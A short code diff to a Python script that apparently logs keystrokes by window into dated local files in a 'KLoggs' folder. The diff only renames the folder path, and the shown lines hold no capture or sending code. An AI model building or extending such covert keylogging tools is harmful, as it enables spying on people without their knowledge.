@@ -10,7 +10,7 @@ from ctypes import windll, create_unicode_buffer
 def main():
 
     home = expanduser("~")
-    path2install = home + "\\Mornielo\\KLoggs\\" + strftime("%Y_%m_%d", gmtime())
+    path2install = home + "\\Mornielov\\KLoggs\\" + strftime("%Y_%m_%d", gmtime())
     global now
     global last
     print("hhh")
@@ -25,7 +25,7 @@ def main():
     else:
         print(path2install + " already exists")
 
-    path = home + "\\Mornielo\\KLoggs\\" + strftime("%Y_%m_%d", gmtime()) + "\\" + strftime("%Y-%m-%d",
+    path = home + "\\Mornielov\\KLoggs\\" + strftime("%Y_%m_%d", gmtime()) + "\\" + strftime("%Y-%m-%d",
                                                                                             gmtime()) + '_logk.txt'
     file_log = path
     current_window = None
